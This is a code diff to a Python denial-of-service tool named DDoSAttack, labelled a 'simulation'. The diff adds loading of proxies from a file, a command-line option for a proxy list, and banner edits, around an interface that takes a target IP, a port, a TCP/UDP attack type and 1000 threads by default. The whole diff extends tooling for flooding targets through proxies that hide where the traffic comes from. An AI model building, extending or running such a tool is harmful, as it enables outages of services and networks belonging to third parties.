@@ -69,30 +69,45 @@ class DDoSAttack:
                 print("[*] Attack completed.")
                 os._exit(0)
 
+    @staticmethod
+    def load_proxies(file_path):
+        proxies = []
+        try:
+            with open(file_path, 'r') as f:
+                for line in f:
+                    if line.strip():
+                        proxy_ip, proxy_port = line.strip().split(':')
+                        proxies.append((proxy_ip, int(proxy_port)))
+        except Exception as e:
+            print(f"[!] Error loading proxies: {e}")
+        return proxies
+
 def main():
-    console.print(Text("""
+    console.print(Text("""                     
                          ____  ____       ____  
                         |  _ \|  _ \  ___/ ___| 
                         | | | | | | |/ _ \___ \ 
                         | |_| | |_| | (_) |__) |
                         |____/|____/ \___/____/ 
                        --------------------------
-                     Developed by: Ibrahem abo kila
-                             +201020687061                          
-        """, style="bold magenta"))
+                     Developed by: Ibrahem abo kila                       
+                """, style="bold magenta"))
+
     parser = argparse.ArgumentParser(description="DDoS Attack Simulation Tool")
     parser.add_argument("-t", "--target", dest="target_ip", type=str, help="Target IP address", required=True)
     parser.add_argument("-p", "--port", dest="target_port", type=int, help="Target port", required=True)
     parser.add_argument("-n", "--threads", dest="threads_count", type=int, default=1000, help="Number of threads (default: 1000)")
     parser.add_argument("-a", "--attack", dest="attack_type", type=str, choices=['TCP', 'UDP'], help="Type of attack (TCP/UDP)", required=True)
+    parser.add_argument("-P", "--proxy-file", dest="proxy_file", type=str, help="Path to proxy list file", required=False)
 
     args = parser.parse_args()
-    proxies = [
-        ('proxy_ip1', 8080), 
-        ('proxy_ip2', 8080), 
-    ]
+
+    proxies = []
+    if args.proxy_file:
+        proxies = DDoSAttack.load_proxies(args.proxy_file)
 
     attack = DDoSAttack(args.target_ip, args.target_port, args.threads_count, args.attack_type, proxies)
     attack.start_attack()
+
 if __name__ == "__main__":
     main()
